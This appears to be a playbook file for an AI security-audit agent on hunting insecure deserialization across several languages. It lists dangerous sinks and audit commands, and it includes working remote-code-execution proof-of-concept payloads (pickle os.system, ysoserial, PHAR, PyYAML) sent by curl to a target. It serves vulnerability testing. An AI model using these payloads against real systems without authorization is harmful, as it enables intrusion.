---
name: deserialization
description: Hunt insecure deserialization (CWE-502) across Python pickle, Java ObjectInputStream / Jackson / SnakeYAML, .NET BinaryFormatter / DataContractJson, PHP unserialize, Ruby Marshal/YAML.load, and Node.js vm. Direct path to unauthenticated RCE.
---

# Insecure Deserialization Playbook

Deserialization is the single most reliable path from a byte string under
user control to unauthenticated remote code execution. Modern frameworks
have tried to wall this off, but chained-gadget attacks (ysoserial,
ysoserial.net, marshalsec, phpggc) still make this a top-tier finding.

## 1. Sources (user-controlled data that becomes an object)

- HTTP body, cookie, header, query param
- Message queue payload (Kafka, RabbitMQ, SQS)
- File upload parsed as config
- WebSocket messages
- Inter-service RPC

## 2. Dangerous sinks by language

### Python
- `pickle.loads` / `pickle.load` / `pickle.Unpickler`
- `dill.loads`, `cloudpickle.loads`, `shelve.open`
- `yaml.load()` *without* `Loader=SafeLoader`
- `jsonpickle.decode`
- `numpy.load(allow_pickle=True)`
- `torch.load` (loads pickled tensors → RCE)
- `joblib.load`
- `marshal.loads`

```bash
grep -rE 'pickle\.loads?\(|yaml\.load\([^)]*Loader=(FullLoader|Loader)?\)|torch\.load\(' /workspace/src
semgrep --config p/insecure-transport --config p/python /workspace/src -o /workspace/sem-deser.sarif
```

### Java
- `ObjectInputStream.readObject`
- `XMLDecoder.readObject`
- `Jackson ObjectMapper` with default typing + polymorphic types
- `SnakeYAML` `Yaml.load()` (before 2.0) — RCE via `!!javax.script.ScriptEngineManager`
- `XStream` without whitelist
- `Hessian`, `Kryo` with registration disabled

Gadgets: ysoserial payloads (CommonsCollections, Spring, Groovy, C3P0)

### .NET
- `BinaryFormatter.Deserialize` (deprecated but still common)
- `SoapFormatter`, `LosFormatter`, `ObjectStateFormatter`
- `JavaScriptSerializer` with `SimpleTypeResolver`
- `Json.NET` with `TypeNameHandling != None`

### PHP
- `unserialize()` on any user input
- PHAR uploads — `file_exists("phar://upload.phar")` triggers deser
- Laravel `decrypt()` → `unserialize` (pre-patched APP_KEY leak chain)

### Ruby
- `Marshal.load`
- `YAML.load` (before Psych 4 safe default)
- `Oj.load` without `mode: :rails`

### Node.js
- `node-serialize` `unserialize()`
- `serialize-to-js` `deserialize()`
- `vm.runInNewContext(userInput)` — not technically deser but same impact

## 3. Gadget chain availability

A sink is only exploitable if the right gadget classes are on the classpath.
Check the lockfile / vendored deps for known gadget-rich libraries:

```bash
# Java
find /workspace/src -name 'pom.xml' -exec grep -lE 'commons-collections|spring-beans|xalan|bcel|commons-beanutils' {} +

# Python
grep -rE 'torch|numpy.*allow_pickle|jinja2' /workspace/src/requirements*.txt

# Node
jq '.dependencies | keys[]' /workspace/src/package.json | grep -E 'lodash|ejs|handlebars'
```

## 4. Taint audit workflow

1. Identify every source (HTTP body/cookie/header handlers).
2. Trace the data through:
   - Explicit `.loads/.readObject/unserialize` calls
   - Framework magic (Spring `@RequestBody` with default typing)
   - File uploads parsed as config
3. For each confirmed source-to-sink path, check gadget availability on
   the classpath.
4. Record as graph vulnerability node. If no gadgets are currently
   available, mark `exploitability="conditional"` — the dep upgrade that
   ships the gadget class is a time bomb.

## 5. PoC templates

### Python pickle (direct)
```python
import pickle, base64, os
class E:
    def __reduce__(self): return (os.system, ("id > /tmp/pwn",))
print(base64.b64encode(pickle.dumps(E())).decode())
```
Send as cookie/body; success = `/tmp/pwn` present or command output reflected.

### Java ysoserial
```bash
java -jar ysoserial.jar CommonsCollections5 'touch /tmp/pwn' | base64 -w0
curl -X POST https://target.com/api/import -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser
```

### PHP PHAR
```bash
php -d phar.readonly=0 build-phar.php
curl -F 'file=@evil.phar' https://target.com/upload
# Trigger: any filesystem call on phar:// wrapper
```

### YAML (PyYAML < safe default)
```yaml
!!python/object/new:subprocess.check_output [["id"]]
```

## 6. Default CVSS

All unauthenticated deser → RCE are **10.0 critical**:
`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

Authenticated deser: drop PR to L → 9.9.

## 7. Validation contract

```python
validate_finding(
  vuln_id=...,
  poc_command="curl -X POST https://target.com/api/import --data-binary @payload.bin",
  success_patterns="uid=0|root@|pwned|/tmp/pwn",
  negative_command="curl -X POST https://target.com/api/import --data 'benign'",
  negative_patterns="200|accepted",
  cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
)
```
